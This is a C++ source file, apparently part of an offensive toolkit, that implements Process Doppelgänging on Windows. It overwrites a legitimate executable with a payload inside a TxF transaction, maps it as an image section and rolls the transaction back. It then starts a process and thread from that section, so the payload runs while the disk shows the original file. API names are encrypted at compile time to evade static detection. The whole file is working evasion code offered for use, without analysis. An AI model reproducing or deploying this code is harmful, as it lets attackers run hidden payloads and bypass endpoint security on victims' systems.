#include "Doppelgang.h"

// ── NT API typedefs for TxF + process creation ────────────────────────────────

typedef NTSTATUS(NTAPI* pNtCreateTransaction)(PHANDLE,ACCESS_MASK,POBJECT_ATTRIBUTES,
    LPGUID,HANDLE,ULONG,ULONG,ULONG,PLARGE_INTEGER,PUNICODE_STRING);
typedef NTSTATUS(NTAPI* pNtRollbackTransaction)(HANDLE,BOOLEAN);
typedef NTSTATUS(NTAPI* pNtCreateSection)(PHANDLE,ACCESS_MASK,POBJECT_ATTRIBUTES,
    PLARGE_INTEGER,ULONG,ULONG,HANDLE);
typedef NTSTATUS(NTAPI* pNtCreateProcessEx)(PHANDLE,ACCESS_MASK,POBJECT_ATTRIBUTES,
    HANDLE,ULONG,HANDLE,HANDLE,HANDLE,BOOLEAN);
typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(HANDLE,PROCESSINFOCLASS,PVOID,ULONG,PULONG);
typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(PHANDLE,ACCESS_MASK,POBJECT_ATTRIBUTES,
    HANDLE,PVOID,PVOID,ULONG,SIZE_T,SIZE_T,SIZE_T,PVOID);
typedef HANDLE(WINAPI* pCreateFileTransactedA)(LPCSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,
    DWORD,DWORD,HANDLE,HANDLE,PUSHORT,PVOID);
typedef NTSTATUS(NTAPI* pRtlInitUnicodeString)(PUNICODE_STRING,PCWSTR);

static HMODULE hNtdll  = NULL;
static HMODULE hKtmW32 = NULL;

static void LoadApis() {
    if (!hNtdll)  hNtdll  = GetModuleHandleA(S("ntdll.dll").c_str());
    if (!hKtmW32) hKtmW32 = LoadLibraryA(S("KtmW32.dll").c_str());
}

// S(#name) encrypts the NT API name at compile time so the string
// "NtCreateProcessEx" etc. does not appear in plaintext in the binary.
#define NTAPI_PROC(type, name) \
    static type _##name = NULL; \
    if(!_##name) _##name = (type)GetProcAddress(hNtdll, S(#name).c_str())

bool Doppelgang::IsTxFAvailable() {
    LoadApis();
    if (!hKtmW32) return false;
    HMODULE hK32 = GetModuleHandleA(S("kernel32.dll").c_str());
    auto fn = GetProcAddress(hK32, S("CreateFileTransactedA").c_str());
    return fn != NULL;
}

std::string Doppelgang::CheckAvailability() {
    LoadApis();
    HMODULE hK32 = GetModuleHandleA(S("kernel32.dll").c_str());
    std::string r = "Doppelganging API availability:\n";
    std::vector<std::pair<std::string,std::string>> apis = {
        {S("ntdll.dll"),     S("NtCreateTransaction")},
        {S("ntdll.dll"),     S("NtRollbackTransaction")},
        {S("ntdll.dll"),     S("NtCreateSection")},
        {S("ntdll.dll"),     S("NtCreateProcessEx")},
        {S("ntdll.dll"),     S("NtCreateThreadEx")},
        {S("kernel32.dll"),  S("CreateFileTransactedA")},
        {S("KtmW32.dll"),    S("CommitTransaction")},
    };
    for (auto& a : apis) {
        HMODULE hM = GetModuleHandleA(a.first.c_str());
        if (!hM) hM = LoadLibraryA(a.first.c_str());
        bool ok = hM && GetProcAddress(hM, a.second.c_str()) != NULL;
        r += "  " + a.first + "!" + a.second +
             ": " + (ok ? "OK" : "MISSING") + "\n";
    }
    r += IsTxFAvailable() ? "\nTxF: AVAILABLE — doppelgänging can proceed.\n"
                           : "\nTxF: UNAVAILABLE (Server Core or patched OS).\n";
    return r;
}

DWORD Doppelgang::Spawn(const char* hostPath, const char* payloadPath) {
    LoadApis();
    if (!IsTxFAvailable())
        return 0;

    HMODULE hK32 = GetModuleHandleA(S("kernel32.dll").c_str());

    NTAPI_PROC(pNtCreateTransaction,    NtCreateTransaction);
    NTAPI_PROC(pNtRollbackTransaction,  NtRollbackTransaction);
    NTAPI_PROC(pNtCreateSection,        NtCreateSection);
    NTAPI_PROC(pNtCreateProcessEx,      NtCreateProcessEx);
    NTAPI_PROC(pNtCreateThreadEx,       NtCreateThreadEx);
    NTAPI_PROC(pRtlInitUnicodeString,   RtlInitUnicodeString);
    NTAPI_PROC(pNtQueryInformationProcess, NtQueryInformationProcess);

    auto _CreateFileTransactedA =
        (pCreateFileTransactedA)GetProcAddress(hK32, S("CreateFileTransactedA").c_str());

    if (!_NtCreateTransaction || !_NtRollbackTransaction ||
        !_NtCreateSection     || !_NtCreateProcessEx    ||
        !_NtCreateThreadEx    || !_CreateFileTransactedA)
        return 0;

    // Step 1: Create TxF transaction
    HANDLE hTx = NULL;
    NTSTATUS st = _NtCreateTransaction(&hTx, TRANSACTION_ALL_ACCESS,
                                        NULL,NULL,NULL,0,0,0,NULL,NULL);
    if (!NT_SUCCESS(st)) return 0;

    // Step 2: Read payload PE from disk
    HANDLE hPay = CreateFileA(payloadPath, GENERIC_READ, FILE_SHARE_READ,
                              NULL, OPEN_EXISTING, 0, NULL);
    if (hPay == INVALID_HANDLE_VALUE) { CloseHandle(hTx); return 0; }
    DWORD paySize = GetFileSize(hPay, NULL);
    std::vector<BYTE> payBuf(paySize);
    DWORD read;
    ReadFile(hPay, payBuf.data(), paySize, &read, NULL);
    CloseHandle(hPay);

    // Step 3: Open hostPath transacted and overwrite with payload bytes
    HANDLE hTransacted = _CreateFileTransactedA(
        hostPath, GENERIC_WRITE | GENERIC_READ, 0, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL, hTx, NULL, NULL);
    if (hTransacted == INVALID_HANDLE_VALUE) {
        CloseHandle(hTx); return 0;
    }
    DWORD written;
    WriteFile(hTransacted, payBuf.data(), paySize, &written, NULL);

    // Step 4: Create image section from the transacted (now-payload) file
    HANDLE hSection = NULL;
    st = _NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL,
                          PAGE_READONLY, SEC_IMAGE, hTransacted);
    CloseHandle(hTransacted);

    // Step 5: Rollback — on-disk file reverts to original (legitimate) bytes
    _NtRollbackTransaction(hTx, TRUE);
    CloseHandle(hTx);

    if (!NT_SUCCESS(st)) return 0;

    // Step 6: Create process from the section (runs payload, disk shows legitimate file)
    HANDLE hProc = NULL;
    st = _NtCreateProcessEx(&hProc, PROCESS_ALL_ACCESS, NULL,
                             GetCurrentProcess(), 0, hSection, NULL, NULL, FALSE);
    CloseHandle(hSection);
    if (!NT_SUCCESS(st)) return 0;

    // Step 7: Get process entry point from PEB then create main thread
    PROCESS_BASIC_INFORMATION pbi = {};
    ULONG retLen;
    _NtQueryInformationProcess(hProc, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);

    // Read ImageBaseAddress from PEB
    PVOID remoteBase = NULL;
    SIZE_T rRead;
    ReadProcessMemory(hProc, (BYTE*)pbi.PebBaseAddress + 0x10, &remoteBase, sizeof(remoteBase), &rRead);

    // Read AddressOfEntryPoint from in-memory PE headers
    IMAGE_DOS_HEADER dos = {};
    ReadProcessMemory(hProc, remoteBase, &dos, sizeof(dos), &rRead);
    IMAGE_NT_HEADERS nt = {};
    ReadProcessMemory(hProc, (BYTE*)remoteBase + dos.e_lfanew, &nt, sizeof(nt), &rRead);
    PVOID entryPoint = (BYTE*)remoteBase + nt.OptionalHeader.AddressOfEntryPoint;

    HANDLE hThread = NULL;
    _NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProc,
                      entryPoint, NULL, 0, 0, 0x1000, 0x100000, NULL);

    DWORD pid = GetProcessId(hProc);
    if (hThread) CloseHandle(hThread);
    CloseHandle(hProc);

    return pid;
}
